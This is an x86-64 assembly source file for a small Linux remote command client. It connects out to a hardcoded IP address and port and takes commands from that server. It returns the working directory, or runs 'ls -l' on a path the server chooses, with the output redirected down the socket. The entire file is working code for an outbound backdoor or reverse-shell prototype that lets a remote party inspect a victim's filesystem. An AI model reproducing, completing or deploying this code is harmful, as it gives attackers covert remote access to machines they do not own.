BITS 64

section .bss
    introPad resb 8
    sockaddr resb 24
    storeHere resb 8
    currentDir resb 100
    readVal resb 100
    finalVal resb 6
    sysinfoStruct resb 104
    lsFilePath resb 15
    padding resb 64

section .data
    ip_address dd 0x3CF7B693
    port dw 0x115C
    newline db 0ah

    lsCommand db "/bin/ls", 00h
    lsArg1 db "-l", 00h
    lsArgs dq lsCommand, lsArg1, lsFilePath

section .text
global _start

_start:
    ;fill sock structure with connection information
    mov word [sockaddr], 2
    mov ax, [port]
    xchg al, ah
    mov [sockaddr + 2], ax
    mov ebx, [ip_address]
    mov dword [sockaddr + 4], ebx
    xor rax, rax
    mov qword [sockaddr + 8], rax

    ;call establish socket and move file descriptor into r15
    mov rax, 41
    xor rdx, rdx
    mov rdi, 2
    mov rsi, 1
    syscall

    mov rdi, rax
    mov r15, rdi

    ;call connect
    mov rax, 42
    mov rsi, sockaddr
    mov rdx, 16
    syscall

    ;receive message from server
    mov rax, 0
    mov rdi, r15
    mov rdx, 100
    mov rsi, readVal
    syscall

    ;check if readVal is pwd command, jump if so, continue if not
    xor rbx, rbx
    mov bl, byte [readVal+2]
    shl rbx, 8
    mov bl, byte [readVal+1]
    shl rbx, 8
    mov bl, byte [readVal]
    cmp rbx, "pwd"
    je getcwd

    ;move command into rbx, assuming it is 'ls'
    mov rbx, [readVal]

    ;remove newline end of readVal (result of using netcat for server testing, will be fixed)
    shl rbx, 8
    shl rbx, 8
    shl rbx, 8
    shr rbx, 8
    shr rbx, 8
    shr rbx, 8

    mov [lsFilePath], rbx

;create a child process to execute execve
child:
    mov rax, 58
    syscall

    ;check if parent or child, jump to parent accordingly
    cmp rax, 0
    jne parent

    ;change stdout file descriptor to socket descriptor
    mov rax, 33
    mov rdi, r15
    mov rsi, 1
    syscall
    
    ;call execve with '/bin/ls' argument
    mov rdi, lsCommand
    mov rsi, lsArgs
    xor rdx, rdx
    mov rax, 59
    syscall

    ;if fails, jump child to exit
    jmp exit

parent:
    ;call wait until child process is dead, then continue
    mov rax, 61
    mov rdi, -1
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ;jump to exit
    jmp exit

getcwd:
    ;call get current directory and store in currentDir buffer
    mov rax, 79
    mov rdi, currentDir
    mov rsi, 100
    syscall

    ;send currentDir buffer to server
    mov rax, 1
    mov rdi, r15
    mov rdx, 100
    mov rsi, currentDir
    syscall

    ;send newline
    mov rax, 1
    mov rdi, r15
    mov rdx, 1
    mov rsi, newline
    syscall

    ;jump to exit
    jmp exit

exit:
    ;call exit
    mov rax, 60
    syscall
